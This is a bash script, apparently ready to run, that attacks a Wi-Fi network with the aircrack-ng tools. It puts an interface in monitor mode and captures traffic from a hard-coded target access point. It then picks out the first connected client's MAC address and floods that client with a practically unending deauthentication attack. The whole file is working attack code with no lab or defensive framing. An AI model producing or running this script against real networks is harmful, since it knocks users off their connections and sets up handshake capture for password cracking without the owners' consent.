#!/bin/bash

# Define variables (replace these with your specific values)
INTERFACE="wlan0"              # Your wireless interface in monitor mode
CHANNEL="6"                  # Channel of the target AP
BSSID="A8:6E:84:B0:8C:23"    # BSSID of the target AP
OUTPUT_PREFIX="psk"           # Prefix for output files

# Step 1: Ensure the interface is in monitor mode
echo "Starting monitor mode on $INTERFACE..."
sudo airmon-ng start $INTERFACE

# Step 2: Run airodump-ng in the background to capture traffic
echo "Starting airodump-ng to capture traffic from $BSSID on channel $CHANNEL..."
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $OUTPUT_PREFIX $INTERFACE &
AIRODUMP_PID=$!  # Save the process ID to kill it later

# Give airodump-ng a few seconds to start and write some data
sleep 5

# Step 3: Monitor the CSV file and extract the first station MAC
CSV_FILE="${OUTPUT_PREFIX}-01.csv"
echo "Monitoring $CSV_FILE for the first connected device..."

# Wait until the CSV file exists and has station data
while [ ! -f "$CSV_FILE" ] || ! grep -q "Station MAC" "$CSV_FILE"; do
    echo "Waiting for station data in $CSV_FILE..."
    sleep 2
done

# Extract the first station MAC address (skip header and probes with no BSSID match)
STATION_MAC=$(tail -n +2 "$CSV_FILE" | grep "$BSSID" | head -n 1 | cut -d',' -f1 | xargs)
if [ -z "$STATION_MAC" ]; then
    echo "No devices found yet. Waiting a bit longer..."
    sleep 5
    STATION_MAC=$(tail -n +2 "$CSV_FILE" | grep "$BSSID" | head -n 1 | cut -d',' -f1 | xargs)
fi

if [ -z "$STATION_MAC" ]; then
    echo "Error: No devices detected. Exiting."
    sudo kill $AIRODUMP_PID
    exit 1
fi

echo "First device found: $STATION_MAC"

# Step 4: Deauthenticate the first device
echo "Deauthenticating $STATION_MAC from $BSSID..."
sudo aireplay-ng --deauth 100000000000 -a $BSSID -c $STATION_MAC $INTERFACE

# Step 5: Clean up by stopping airodump-ng
echo "Cleaning up..."
sudo kill $AIRODUMP_PID
sleep 2  # Give it a moment to stop gracefully

echo "Done! First device deauthenticated."
